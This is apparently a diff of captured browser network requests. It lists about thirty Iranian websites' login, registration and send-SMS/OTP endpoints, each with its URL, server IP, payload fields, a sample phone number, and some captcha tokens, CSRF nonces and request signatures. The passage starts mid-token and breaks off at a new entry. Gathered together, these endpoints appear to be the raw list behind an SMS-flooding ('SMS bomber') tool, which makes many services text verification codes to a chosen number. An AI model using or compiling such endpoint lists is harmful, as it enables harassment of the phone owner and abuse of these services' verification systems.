YZWZ2akwvdytQOVBncFFBbXR4cWxMd0RyMFoyTHQrRE1YczlwRWNzdlNRQ0MxZFFuS2FNRnhOdGxSSXNIWkFjUnZkMjRIS253dTUvUlpKY2JnV2w5VThJSUhTL0l5WFJYR3hOREJyUkx6L24vaGVRS1ZPSnFvRytLMXcxa0MzSHZSSVBZSmNsM0FOT3hEdGZhT3czR1FJT3A2T3R1MUhYR3ZIR211YXlIblVtMVk0KzFaSmhoYXNlbElnWVNzNnpMTTVrYmFyeEwzcGE1NzZ4eC9tSTdJazdlSHdOUEM3ZW14ajIyMXNqM3VNcHUyWjNZWDVEZWI5RXhjaS9aa2huYnlGWkh4S2ZCc0svL2krM09tZGxxNmM0ZGgwV3ZjVFlIWERtUTV2WUt3ampPT2VUY0ZWeGhLRzVKQVdqajViRHBOcmFNNjU3WDB6eFlSc3JodVVqUm1JdHdZcXdPOFE5bm1rcHowaERvanJrTXNQc3dpQkkxYlJaWlhCUlhLV2FkN0xlL1hyOVRVeHhkREFIdDcrY3NmeUhpZCs1NGdkQmduY25Va0R1d0lReS9kYzVhTDdHaFNVeHh3TXgyMEVCNytRUEJqaTIwcXJ2VWxxc0xDZ3VDb3ZIOVpiOURpYysvSmRBcDhWYlpMN29nPT0iLCJleHAiOjE3NDU3NTY2ODYsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzVlYjVkMmYiLCJwZCI6MH0.fsCNBtMP-bzV78tGFzZFbppXUKlibDHzjT8hWzz6uso"
-phone
-: 
-"9128887474"
-smsStatus
-: 
-"default"
----------------------------------------------------------------------------------------------
-Request URL:
-https://app.itoll.com/api/v1/auth/login
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456"}
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://api.lendo.ir/api/customer/auth/check-password
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09122221010"}
-mobile
-: 
-"09122221010"
-
-2:
-Request URL:
-https://api.lendo.ir/api/customer/auth/send-otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09122221010"}
-mobile
-: 
-"09122221010"
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.pinorest.com/frontend/auth/login/mobile
-Request Method:
-POST
-Status Code:
-201 Created
-Remote Address:
-31.14.119.250:443
-Referrer Policy:
-no-referrer
-
-
-{mobile: "09123456456",…}
-captcha
-: 
-"03AFcWeA7loQ4B5UR2BP91IxM-Yv1FCYJMw3rMs_4XjC7f9Ux2TUsWuSeoVo0ZI6IuA6-p8zGEDs-joc01e7zqhkTo7ZyCm4ZNZUNkN19-fW12CbjdKq0zeGWLYkOavV7TwwqWdTUNmzNqG0WT-BVy8kh4SeH2q91wJjaSwf200L3cmZmxVd-WBRRbluteCmX6ntb4X6JP-I2LTopBJUuBa0hoczCWy1dRnlTsxtvsRPlsT9HPs286NsrNVW4hlVXIgn5gcJkHHIHOlFgCJqrb94vb-EF5sM5XjvQw3sXkXmtQSVONfPgO6kd1tHKfnZSWweG1_2TgBzgl0p6xe3KkJtMk85J9gmOQMrK4e8gKDJ7urMR5K8I_tUQlcfDnUaNIACAgWQKlbpKs928VqnrR-xLgJkcy5nQ4gk2lOgYU1vaTUyR06_LaRy8OPxCaRWRcSEwCI6ll69GFX7YHTQjiWH2hl5oOjUt7EU224TRu24etpDGFnu7etxhQfjFDqv9MRGiAD9gR42IDdoqreFaqBAX6AnKcCPj3Cm4soJbVr3XXj4rz73KUpDUjEM-zynndGMx1Bs-ck-zbTv8e39sx4TpcVP7ZwxsMtGv2bBcEI5lPRZRVAj3mZa20n2WU-RuCMyObN8T5eNQeNhiPA4hzXge6kDeZcf162Be9VgPAfZdaE2aFGuBxykPtBdYqsZdTDoGFg4zONm4HaeRporutNdFJ7lZcr3JErT5o5b-8lo_bNBx8R8_Qe1IRZu-mCTvR9doRqDxT6y94GSLYif9cecO4i7Tj4r4M333h39U7G07gI6kb3o70VYXNfFfGJH1INuy-hGnPb-cnK84cmZSC4J_ncmrWaSo0LRbBD58lGdUCi3IUj-AtV2XASiq3ZC5SmOK_nG34mX-qR5ux_id2wSr-m8qJQtAxRC_EN2If-tNJxLuxhMpVd4k"
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.mobit.ir/api/web/v8/register/register
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{number: "09123456456", hash_1: 1745760096,…}
-hash_1
-: 
-1745760096
-hash_2
-: 
-"0d6f656b3e726b9180b9572bd8c670ca79c2766d6ea60ca5b2b0fe34cc41f3eb"
-number
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-login site:
-Request URL:
-https://api.mobit.ir/api/web/v6/register/login
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{number: "09123456456"}
-number
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.vandar.io/account/v1/check/mobile
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456",…}
-captcha
-: 
-"0.n56wNh1MIryJwM8YUbAfch3VRCT3_h59FfEKddwU20Gl8Wr9Itw5XU82g8KoyFy_uW-Z9nukmLL3HEnBoNAYvlx5IN6hmCmpk7V3ylkn-UUxDy0RNT1tSFCWqyssNnu7XsHEk4QHrcq-ribX5J-mRfmwZyN9hfCwDF5riDk0689GiS3Yzy0H60gdtcTgEFAF-Vkr9zsTOuSkPSdjPnbAZtUnYT_w_jTXkObFGEkwjAWgGORnv0OcW7J8DdbMtjZFrTr3nwndKMvxa3dpwh4YMnJcfyoVKMJm9oDI35duJGtkia_NUQKwCjx5BivAYnsmyg0pP7ZEpeFByK_JRajdGmsvWiJldS1wJvJUiMn_yLa7UYvESasLAqllZq8dc6LW6lDmQRpE4qSWBwuHKrxVnNBQED5OzkIpj1nMfk5yyGU90u6q4yIRoKF5l2DoDVq2L7CrIKwbYHBEON9q22YxAIu8dX9xbNoZdvzW0un6riqYCeyvgcCbT90nZ-t4ZB1JXtn3tNBGdEmLnulnK6lfNRCEFcXCYqsYdnKUBD1EVXslBfy1-fZbEufmk_pXOnpEDifebGxd7ZTdOKQI8p9IdbF-zuR0iNw3mT207oPVlOCsa7xHtDPE3vy9rSHHMCsb3KMJQlyvEiR7SoP1mbVxtXKzqrmMPPQnpxE9eBxo2H0lvF_ywZRQNpxRYLKcLVVHHHvbQKddyk9uVx4aUvTidj2eVhiOZIwVdAHoe1nKvC21mo_y7uKGfJFZ6qdheD2WlzIHCbMq_D5ODOlYd2wv1EEQN2XRqILC0Pc_9XPv9FFlOtfP1Lfvbddytm-QHYuLTxvu49UWf6GQO0yztTBQY2IhYo4WnrWSFc_I-rmzHfg.k4ZdqANwuZgqiTXRrO0-Kg.791881e821fba69e2e8ce272ebaf771ece1cb89f16a28b067e6dd49293f77006"
-captcha_provider
-: 
-"CLOUDFLARE"
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://drdr.ir/api/v3/auth/login/mobile/init/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09128887494"}
-mobile
-: 
-"09128887494"
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-94.182.177.106:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{phoneNumber: "09128887484", origin: "www.azki.com"}
-origin
-: 
-"www.azki.com"
-phoneNumber
-: 
-"09128887484"
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&sessionId=dc36a2df-587e-412f-96cd-d483d58e3daf&lat=35.774&long=51.418
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-client: PWA
-optionalClient: PWA
-deviceType: PWA
-appVersion: 5.6.6
-clientVersion: a4547bd9
-optionalVersion: 5.6.6
-UDID: 2bb22fca-5212-47dd-9ff5-e6909df17d6b
-sessionId: dc36a2df-587e-412f-96cd-d483d58e3daf
-lat: 35.774
-long: 51.418
-captcha: 03AFcWeA4JX9o3MUNFM-ovIuFVAE1DlhAsSdQnyVmbGLZkFHb3SlykTrd0M14kqZtXC-cJJ9qJ5bwCwnDQEg2TW7feL1bYumHJEF9C-PIqky933owT8RiwVzgEX8zdAgco5qk1Il-HyvVcQlG8D6uiVRduYxpurwSkRkZZy2equG0dT22QQuu6HkKCFWvrU5s8kteJQVrdtPtEw6Vx0uzLic40jF5xDMP8T_XXaNPYcB-csjO2HtNgd25FrEx_aF3VEIS4sNA9PQA0k9s_fYnPudAZtRkPSDn93gklmLxRy30kzzyhA9xedYPSUhm9RztoNeTWCLheDn2SPYbcePuXLCGFSbWlzOknJGdd9xctLpKq0gCb1eU-Q-pa39-zIsrgWi21dvbhIQnMICkUdoLyZ8_QZMhDTl20C8Gc9J1kDNSOhUbycsOg8Q4tb5lvM2PYOpQTHV3XpH3KFrnHjvAwrOxHfp3U1maf0KQYrZYVbvvpXRz5tWOSENTrRCz0fq_7rijvEJQgLrAYqjcrNj_5VJsW6laTFidAzugxO2qgKJp4ENvHq0JZAD0T2YAEoY1Jfe3lAKlCD0HDN7ehb4XM917bb7XDcRzC_S7CObTceiR2dlYEqv75h7x8OCzMy6PjhVdBVlrPmmHDALlleDtbw2IjV9pksCJxvTPesRsy7CKL80STm0ydCrPz0C87rYnK9c4nKDTH-kyESZ2Nqufo3V1wiJSL8WS1G4g7JAjgbM9e-kMpRVmS67ODMtUuyS7ANezay24taoz4DpWUJxZ7IcRcmGXixITep7Ks_EkQi_xvzOiOQho44141xSfeqAw2eaaQv648LsXN9wwWc13srrPUUmhbRzLqG5K_y15pdSK_KtPGZZ-BmLVNo5u5l1P91fNnaRApFtaojUVPfIVadYAxNSPtFC7GSeg6u7vT73wlVybIAUZxz7A
-cellphone: 09123456456
-optionalLoginToken: true
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://www.digistyle.com/users/login-register/
-Request Method:
-POST
-Status Code:
-302 Found
-Remote Address:
-185.188.106.11:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-loginRegister[email_phone]: 09123456456
-
-2:
-Request URL:
-https://www.digistyle.com/users/register/confirm/?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ijk4OTEyMzQ1NjQ1NiIsInNraXBNZXJnZSI6ZmFsc2UsImRpc3BsYXlES0FjY291bnRNb2RhbCI6ZmFsc2V9.Q70DNmeXXIk-saF89V3b7tBd22wnR_K9MXGm-Is2lQg&type=register
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.188.106.11:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ijk4OTEyMzQ1NjQ1NiIsInNraXBNZXJnZSI6ZmFsc2UsImRpc3BsYXlES0FjY291bnRNb2RhbCI6ZmFsc2V9.Q70DNmeXXIk-saF89V3b7tBd22wnR_K9MXGm-Is2lQg
-type: register
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.nobat.ir/patient/login/phone
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-mobile: 9123456456
-use_emta_v2: yes
-domain: nobat
----------------------------------------------------------------------------------------------
-Request URL:
-https://elecmake.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.223.160.53:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: voorodak__submit-username
-username: 09123456456
-security: 8b9b30d94d
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.epasazh.com/api/v4/blind-otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456"}
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://roustaee.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.165.31.6:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: digits_check_mob
-countrycode: +98
-mobileNo: 9121111010
-csrf: 3abc6a6cd5
-login: 1
-username: 
-email: 
-captcha: 
-captcha_ses: 
-digits: 1
-json: 1
-whatsapp: 0
-mobmail: 9121111010
-dig_otp: 
-rememberme: 1
-dig_nounce: 3abc6a6cd5
----------------------------------------------------------------------------------------------
-Request URL:
-https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=07ScTpJiQCPAK3cs1SbnS8%252Foh%252Fgnl1MRCEKARMxOSjzIJv816WIPFiCjsmxDDn0zmsW1NVbDvldQ0p%252FsV5pmeA%253D%253D
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-captchaId: 07ScTpJiQCPAK3cs1SbnS8%252Foh%252Fgnl1MRCEKARMxOSjzIJv816WIPFiCjsmxDDn0zmsW1NVbDvldQ0p%252FsV5pmeA%253D%253D
-09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.buskool.com/send_verification_code
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{phone: "09123456456", token: "6Wdx9xVT1P8A2cRG3vrL41QiS.91Xp5KiS6ja34E6y5xOh6lSXa",…}
-client
-: 
-"web"
-device_id
-: 
-"969835200.1745303896788"
-phone
-: 
-"09123456456"
-token
-: 
-"6Wdx9xVT1P8A2cRG3vrL41QiS.91Xp5KiS6ja34E6y5xOh6lSXa"
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://oteacher.org/api/user/register/mobile
-Request Method:
-POST
-Status Code:
-201 Created
-Remote Address:
-185.143.233.120:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{client: "xLjNuxt%2z@", mobile: "09123456456", timestamp: 1745761870358,…}
-client
-: 
-"xLjNuxt%2z@"
-mobile
-: 
-"09123456456"
-sign
-: 
-"GDIXWq37TnSp1dnLYg+EqinVGSzVMqn1WfctpwSPVARtuOqoXmfD84ObvlSY6nEiE341FZ6gnWVJKPDn7soev74QMqE5Pq8WG9eaHO7vuIYiboPou6nWekfzoN3FvlqrNbxd9W77UQ1QaMpifapL2PdsF+WSPpaMBPVwAnNxIF/T9GdQ4ScILhZFEqT2X76gTLg6Ub8kYuI4e5sNVw45xHdNG8rcK8owTJWuft1hIkiAOmyViCT2JdS3bgRvMLsRBjpeBohWgMaYj3gXh+FJouN9l28eSE6CKTlUHjSjqjv3qEvGmKydCe1TN3f0C2PZ6QnCGo8N/5Oyu5o4JeE9Jg=="
-timestamp
-: 
-1745761870358
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://tikban.com/Account/GetUserLoginStatus
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-31.214.168.43:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{Username: "", CompanyName: "tikban", IsAuthenticated: false, UserMustBeRegister: false,…}
-BackupTelephones
-: 
-"22554433"
-CompanyName
-: 
-"tikban"
-FakeResellerActived
-: 
-false
-IsAuthenticated
-: 
-false
-RegisterRequiredFieldsSetting
-: 
-{HasEmail: false, HasPhoneNumber: true, HasFirstName: true, HasLastName: true, HasOfficeName: false,…}
-User
-: 
-null
-UserAccountBalance
-: 
-0
-UserAccountRealBalance
-: 
-0
-UserAccountRealCredit
-: 
-0
-UserAgencyInfo
-: 
-null
-UserInfo
-: 
-null
-UserMustBeRegister
-: 
-false
-Username
-: 
-""
-
-
-2:
-Request URL:
-https://tikban.com/Account/LoginAndRegister
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-31.214.168.43:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phoneNumberCode: "+98", phoneNumber: "09123456456", CellPhone: "09123456456",…}
-CellPhone
-: 
-"09123456456"
-phoneNumber
-: 
-"09123456456"
-phoneNumberCode
-: 
-"+98"
-recaptchaToken
-: 
-"03AFcWeA4kMRXwJNxBvcKizOUr0kHg7TkGDjhxO9dDbFeHR_LLFsi3mTePh_xeCdOEfeo1jGwqegm7hk43T6ylWw3fb_TuLM8ETYiFymAq0kj-50AQa8ao1YuKA-aX_FDJLCNw_f0wiqV03swlBQV9YxPKLa0BxyUMTjuk_ML9YJDtfJBBUHkjzNOiadN8jQs-STcl3KJaeN9OzaPPU0IbW33GRgmT-Les6CYoVpgG5nv0sydTJ9WXbDikExdcs1n3ndnDsdHYJ0ROvbe0IqpTSZAXOcmfC98YstVbvgp6wvCiT0FxYUoRg3eD9Bwf4NgI-ye0LA20VSl-WlmrCewo4r_hhW0MmNAj1GNU-Ey4Izmmzm07pPbl0KDyKDBFxI9uP1MnETDTl8-SPA0Qe5juw1yzNg83cwUZMTJxjRNlVuk4m_189SYPg48qJvqSDfhB0ama-RuBrXNrHRvnmTbhjb6ydafIFoeKnEj7RAPQcx6WEalT7jlf77QHeniG4I-A5OvG0PN10qqL5ULsH1pVeZa-Ws51JshhVFNMEifNVIjigYsim5R-jC1H6RStVpZgs-AB3TzW8GonpyVEhvZemutqU7s6jg410OGPNiYz1jIIMXh74RCEhhWme7rT8g8FlrCfdIkilRhm4Y4hbu4J0-_zU17BdsrVpstNuIkU-jxiKzONzXufcDk8H5hYBFYnftZLDb8DCPjvfvXD809yTwPVZgHLvdqkA7tAPFwN1toTY3mK-VPLpoCbI1SUyRPDaugDo0UclVQlPm2EN7dgPZRULEifoeL-APeUThTMXYRbfjDYdAbEkXTUN-XfNB8ErYfaEdgPX3OjXH56WPDmXERE6w7ZsVJmS80_wlSDSc0TG1lPUEm-BOFs9vxxBYFn96FV139b1SlP_fYV9fhgvH2hcSEsUyRXxfpIGWhMlAyqkh5pxt1NDsiEB7vEfZ8gk-oN49n9Cfr7gTWDI87SukkbS17wyDFxS29QZGlCmCY27g6Zc4bx_hi-vG3oFTJ_TeR42ZBxGgnbcgy3QoYKm7FdS3aq57wGucQMwg4BrtLBfGUPBrX3QijY4AlYbSP_WliKUCwjTpJUJyV7iNp8dkKl6_nNlHYPj0lhV1Dz86Yiu9s-vJH90u7TCEZIRsIBZXJkPz1tMA1QkV7oHpWjxXPfreTWOEWkWAgtTt-R1JZg9gFWT0iTINda9ZWuyMTO-SZHk0r0ZNdAPIRfFZYYaQYNc2exFlrYlwpKNJxXXFqrE5J1wLQUmTiGDRUQg_l8Fao48V3eX-Cv7bknSb66EhCKkUpa8YF_k64wmmEXLGm9E0Ycpe9YGvQc5-6i0V412odfttfQy1Sp6-3_hr1yxQHGD0J4vSzI4aJcNCj3So2uHS46HpdBmoTeUxwVrwjV9HFvHjEkF00Lkyo5ubg72d70SCF4s7xETTWoKuV_gIqJkF1s5ijV_4115wPgBoXRllLwIt8pjjE1B3L_N0nX6un1ix5tqJ4XwwzrVH-gJuxkyXwBEi_lVjdlALRNCt-Dnc7erOuApalwEpiCCL2uDF5IG1Jx3bGnnr2R02oMv0Sf76J-bSW3csQ-T7sOmkItZ7JEkiqi4yddt2STS9h_kGySPIc7TGBQmi4oPNLVTow2VX1QEXqp31PcRzygsnGfTN2GD3c1PBcDBHCU-5hbPb-EDfKypWNuPbhSUJYRqT6gszeSE4ktkf6VtcVEjKnfeGCYM_3ug7cQxXYw5JC1ejjVNeGp6nJVv_sSUTli7vz_0bw5oPpNPODQJmrGJNRsliNg5z0murMg0I9aM0LZoL2Lvpjj9oAZ2ub3cLzRMmXD2XYC0V8K5nP8IxpFpbhRxH2PxzDRPALOJSr69sQsmmEu8f-ICc89y0wfY9NVMRPC2634mGQOUt3QX1iB5WkDMX1WXOSz1qFS-YwkisTT9ZbCLC0-Yke7HtTJ6vQ_dq86t9ExchdxF3WDU9AWsLIxKPoHvp9HBlde0qCohvwz7MeNTPjM_vawVCXRN6ElsOeKBBI4VmUEHyU"
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.mydigipay.com/digipay/api/users/send-sms
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{cellNumber: "09123456456",…}
-cellNumber
-: 
-"09123456456"
-device
-: 
-{deviceId: "2d1ae273-8caf-48e1-80ce-f6d71b144672", deviceModel: "Windows/Chrome",…}
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.236.36.239:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-redirect: /search
-username: 09128887484
-password: 
-step: start
-ms_uuid: 43605b4b-c34a-4fc6-99ab-45d93e4a4065
-ms_key: d133df52e064b64b8990b7a97d22cfe3
-_mosparo_checkboxField_33568269781513: 1
-_mosparo_submitToken: pNNDkMy8zhIpKh-KehLp2W6Q4xXxNpjahvOyiubx9R0
-_mosparo_validationToken: OsZJyEzxayNSt4QLZoDHuYrS-uNcyG2m086bITbUjh4
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.motabare.ir/v1/core/user/initial/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-104.21.48.1:443
-Referrer Policy:
-origin-when-cross-origin
-
-{mobile: "09128887484"}
-mobile
-: 
-"09128887484"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.88.177.222:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-countryCode: +98
-mobile: 9121111010
-
-
-2:
-Request URL:
-https://nazarkade.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.88.177.222:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: digits_check_mob
-countrycode: +98
-mobileNo: 9121111010
-csrf: 43d977c43f
-login: 2
-username: 
-email: 
-captcha: 
-captcha_ses: 
-digits: 1
-json: 1
-whatsapp: 0
-digregcode: +98
-digits_reg_mail: 9121111010
-digits_reg_password: x
-digits_reg_name: x
-dig_otp: 
-code: 
-dig_reg_mail: 
-dig_nounce: 43d977c43f
-
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://www.filimo.com/api/fa/v1/user/Authenticate/auth
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.147.178.23:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{guid: "9701FC61-142A-EA96-700A-487379970CD0"}
-guid
-: 
-"9701FC61-142A-EA96-700A-487379970CD0"
-
-
-2:
-Request URL:
-https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.147.178.23:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{account: "09123456456", temp_id: "497241", guid: "9701FC61-142A-EA96-700A-487379970CD0"}
-account
-: 
-"09123456456"
-guid
-: 
-"9701FC61-142A-EA96-700A-487379970CD0"
-temp_id
-: 
-"497241"
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.achareh.co/v2/accounts/login/?web=true
-Request Method:
-POST
-Status Code:
-201 Created
-Remote Address:
-185.166.104.4:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-web: true
-{phone: "989123456456"}
-phone
-: 
-"989123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://experts.achareh.co/join?m=09121111010
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-188.213.196.152:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-m: 09121111010
----------------------------------------------------------------------------------------------
-Request URL:
-https://ws.alibaba.ir/api/v3/account/mobile/otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-45.89.201.11:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phoneNumber: "09123456456"}
-phoneNumber
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://app.ezpay.ir:8443/open/v1/user/validation-code
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-77.238.111.218:8443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phoneNumber: "09123456456", os: "Windows", osVersion: "10", browser: "Chrome",…}
-browser
-: 
-"Chrome"
-browserVersion
-: 
-"135.0.0.0"
-device
-: 
-""
-os
-: 
-"Windows"
-osVersion
-: 
-"10"
-phoneNumber
-: 
-"09123456456"
-presenterCode
-: 
-""
-
-
-2:
-Request URL:
-https://app.ezpay.ir:8443/open/v1/user/validation-code
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-77.238.111.218:8443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{phoneNumber: "09123456456", os: "Windows", osVersion: "10", browser: "Chrome",…}
-browser
-: 
-"Chrome"
-browserVersion
-: 
-"135.0.0.0"
-device
-: 
-""
-os
-: 
-"Windows"
-osVersion
-: 
-"10"
-phoneNumber
-: 
-"09123456456"
-presenterCode
-: 
-""
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=09123456789&uuid=web_0196779b-ebc8-73a5-9142-23b639c49334
-Request Method:
-GET
-Status Code:
-200 OK (from service worker)
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-mobileNumber: 09123456789
-uuid: web_0196779b-ebc8-73a5-9142-23b639c49334
-
-
-2:
-Request URL:
-https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=09123456789&uuid=web_0196779b-ebc8-73a5-9142-23b639c49334
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.166.104.4:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-mobileNumber: 09123456789
-uuid: web_0196779b-ebc8-73a5-9142-23b639c49334
----------------------------------------------------------------------------------------------part✅✅✅✅✅✅
-1:
 Request URL:
 https://www.technolife.com/shop_customer
 Request Method:
